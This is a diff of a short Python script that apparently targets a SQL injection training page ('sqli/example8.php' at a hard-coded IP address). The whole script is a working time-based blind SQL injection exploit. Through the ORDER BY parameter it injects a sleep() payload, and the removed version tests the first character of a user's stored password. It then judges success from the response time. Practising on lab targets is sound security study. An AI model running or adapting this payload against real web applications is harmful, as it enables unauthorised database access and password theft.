@@ -1,12 +1,12 @@
 import requests
-import time
 
-sql = 'select sleep(3) from users where ASCII(SUBSTRING((SELECT passwd FROM users WHERE id=1), 1, 1))=97'
-url = f"http://155.185.124.242/sqli/example8.php?order=`,({sql}) -- `"
-print(url)
+ip = '155.185.124.242'
+sql = 'select sleep(3)'
+url = f"http://{ip}/sqli/example8.php?order=id`,({sql}) -- `"
+print("Expected URL:", url)
 
-start_time = time.time()
-requests.get(url)
+response = requests.get(url)
+print("Actual URL:", response.url)
 
-if (time.time() - start_time) > 2:
-    print('Success')
+if response.elapsed.seconds >= 3 and response.ok:
+    print(f'Success: {response.elapsed.seconds}')
